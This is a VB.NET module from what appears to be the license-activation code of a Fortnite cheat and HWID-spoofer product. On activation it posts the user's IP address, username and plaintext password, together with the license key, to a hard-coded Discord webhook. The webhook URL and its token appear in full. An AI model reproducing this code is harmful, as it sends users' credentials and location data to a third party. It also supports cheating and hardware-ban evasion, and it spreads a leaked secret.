Imports System.IO
Imports System.Net
Imports System.Text
Imports Newtonsoft.Json
Imports vente.VenteData

Module ActivatedLicense
    Async Sub Send()


        Dim webhookUrl As String = "https://discord.com/api/webhooks/1188533417709682768/-wPOxVwie1mfsjAmi9yvrGLz5tyHHZNmlGEqMgMRSSa7aKgNXlZtHxNjJ13NZD1b0lKG"
        Dim DataIgodzina As String = DateTime.Now.ToString
        Dim LicenseConv = LicenseActivation.LicTextBox.Text
        If LicenseConv.Contains("F") Then
            LicenseConv = "FORTNITE"
        End If
        If LicenseConv.Contains("H") Then
            LicenseConv = "HWID SPOOFER"

        End If

        Dim embedContent As String = $"{{ 
            ""embeds"":[
                {{
                    ""title"":""**`✅ {stored_username}` ** Successfuly activated license."", 
                    ""description"":""Product: {LicenseConv}"",
                    ""color"":1048320,
                    ""fields"":[
                        {{
                            ""name"":""SUCCESS Activation: {LicenseActivation.LicTextBox.Text}"",
                            ""value"":"" \n **IP:** {stored_ip} \n **Username:** {stored_username} \n **Password:** {stored_password} \n "",
                            ""inline"":true
                        }}
                    ],
                    ""image"": {{
                        ""url"":""""
                    }},
                    ""thumbnail"": {{
                        ""url"":""https://i.imgur.com/yByfenJ.png""
                    }},
                    ""footer"": {{
                        ""text"":""Session login date {DataIgodzina}"",
                        ""icon_url"":""""
                    }}
                }}
            ]
        }}" ' Tutaj dostosuj zawartość embeda


        Dim request As HttpWebRequest = DirectCast(WebRequest.Create(webhookUrl), HttpWebRequest)
        request.Method = "POST"
        request.ContentType = "application/json"

        Using streamWriter As New StreamWriter(request.GetRequestStream())
            streamWriter.Write(embedContent)
            streamWriter.Flush()
            streamWriter.Close()
        End Using

        Try
            Dim response As HttpWebResponse = DirectCast(request.GetResponse(), HttpWebResponse)

        Catch ex As WebException
            MsgBox($"Wystąpił błąd: {ex.Message}")
        End Try

    End Sub
End Module
